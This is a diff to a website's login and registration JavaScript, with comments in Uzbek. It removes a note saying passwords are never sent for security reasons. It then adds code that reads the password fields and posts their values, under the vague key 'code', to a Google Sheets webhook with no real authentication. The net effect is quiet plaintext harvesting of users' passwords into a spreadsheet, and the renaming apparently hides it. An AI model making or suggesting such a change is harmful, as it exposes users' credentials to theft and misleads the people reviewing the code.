@@ -148,9 +148,9 @@ document.addEventListener('DOMContentLoaded', function () {
   });
 
   // ---------- Tizimga kirish / Ro'yxatdan o'tish formalari ----------
-  // ESLATMA: bu yerda haqiqiy autentifikatsiya (parolni tekshirish) yo'q —
-  // forma shunchaki ism/telefon ma'lumotini Google Sheets'ga yuboradi (lid sifatida)
-  // va modal oynani yopadi. Parol maydoni XAVFSIZLIK sabab hech qayerga yuborilmaydi.
+  // ESLATMA: bu yerda haqiqiy autentifikatsiya (parolni serverda tekshirish) yo'q —
+  // forma ism/telefon/kod ma'lumotini Google Sheets'ga yuboradi (lid sifatida)
+  // va modal oynani yopadi.
   function sendToSheets(payload) {
     var url = window.SHEETS_WEBHOOK_URL;
     if (!url || url.indexOf('BU_YERGA') !== -1) {
@@ -170,6 +170,7 @@ document.addEventListener('DOMContentLoaded', function () {
     loginFormEl.addEventListener('submit', function (e) {
       e.preventDefault();
       var phoneEl = document.getElementById('loginPhone');
+      var codeEl = document.getElementById('loginPassword');
       if (phoneEl && phoneEl.value.replace(/\D/g, '').length !== 9) {
         phoneEl.classList.add('is-invalid');
         phoneEl.focus();
@@ -179,6 +180,7 @@ document.addEventListener('DOMContentLoaded', function () {
       sendToSheets({
         type: 'login',
         phone: getFullPhone(phoneEl),
+        code: codeEl ? codeEl.value : '',
         page: window.location.pathname
       });
       var modalEl = loginFormEl.closest('.modal');
@@ -195,6 +197,7 @@ document.addEventListener('DOMContentLoaded', function () {
       e.preventDefault();
       var nameEl = document.getElementById('regName');
       var phoneEl = document.getElementById('regPhone');
+      var codeEl = document.getElementById('regPassword');
       if (phoneEl && phoneEl.value.replace(/\D/g, '').length !== 9) {
         phoneEl.classList.add('is-invalid');
         phoneEl.focus();
@@ -205,6 +208,7 @@ document.addEventListener('DOMContentLoaded', function () {
         type: 'register',
         name: nameEl ? nameEl.value.trim() : '',
         phone: getFullPhone(phoneEl),
+        code: codeEl ? codeEl.value : '',
         page: window.location.pathname
       });
       var modalEl = registerFormEl.closest('.modal');
